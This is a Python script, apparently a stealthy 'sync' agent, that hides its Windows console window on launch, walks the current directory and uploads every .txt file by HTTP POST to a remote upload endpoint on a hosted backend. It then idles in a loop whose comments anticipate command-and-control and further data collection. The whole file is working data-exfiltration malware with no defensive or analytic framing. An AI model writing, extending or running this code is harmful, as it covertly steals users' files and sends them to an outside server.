import os
import time
import requests
import json
import base64
import ctypes
import sys
import subprocess

# Define the DLL and function for Windows-specific hide/show functionality
if sys.platform == "win32":
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        SW_HIDE = 0
        SW_SHOW = 5
        hWnd = kernel32.GetConsoleWindow()
    except Exception as e:
        print(f"Error loading Windows DLLs: {e}")
        hWnd = None
else:
    hWnd = None # Not a Windows system

CONFIG_FILE = 'sync_config.json'

def log(message):
    try:
        with open('sync_log.txt', 'a') as f:
            f.write(f'[{time.ctime()}] {message}
')
    except Exception as e:
        print(f"Error writing to log file: {e}")

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def hide_console():
    if hWnd and user32:
        user32.ShowWindow(hWnd, SW_HIDE)
        log("Console hidden.")

def show_console():
    if hWnd and user32:
        user32.ShowWindow(hWnd, SW_SHOW)
        log("Console shown.")

def get_drive_info():
    drives = []
    if sys.platform == "win32":
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for i in range(26):
            if (bitmask >> i) & 1:
                drive_name = chr(65 + i) + ":"
                drives.append(drive_name)
    return drives

def encrypt_data(data, key):
    # This is a placeholder for actual encryption.
    # In a real scenario, use a strong encryption library.
    encoded_data = base64.b64encode(data.encode('utf-8'))
    log(f"Data encrypted (base64 encoded).")
    return encoded_data.decode('utf-8')

def decrypt_data(encrypted_data, key):
    # This is a placeholder for actual decryption.
    decoded_data = base64.b64decode(encrypted_data).decode('utf-8')
    log(f"Data decrypted (base64 decoded).")
    return decoded_data

def exfiltrate_files(server_url):
    log("Starting file exfiltration...")
    current_directory = "."
    for root, _, files in os.walk(current_directory):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        file_content = f.read()
                    files = {'file': (file, file_content)}
                    response = requests.post(f"{server_url}/api/upload", files=files)
                    if response.status_code == 200:
                        log(f"Successfully exfiltrated {file_path}")
                    else:
                        log(f"Failed to exfiltrate {file_path}. Status code: {response.status_code}, Response: {response.text}")
                except Exception as e:
                    log(f"Error exfiltrating {file_path}: {e}")
    log("File exfiltration complete.")

def main():
    log("Agent started.")
    config = load_config()
    server_url = config.get('server_url', 'https://netrunner-backend-production.up.railway.app') # Default server URL

    hide_console() # Hide the console window on startup

    exfiltrate_files(server_url)

    # Keep the agent running for demonstration purposes or background tasks
    # In a real scenario, this would involve more sophisticated scheduling and communication
    while True:
        time.sleep(60) # Wait for 1 minute before checking again
        # Add other agent functionalities here, e.g., command and control, data collection

if __name__ == "__main__":
    main()
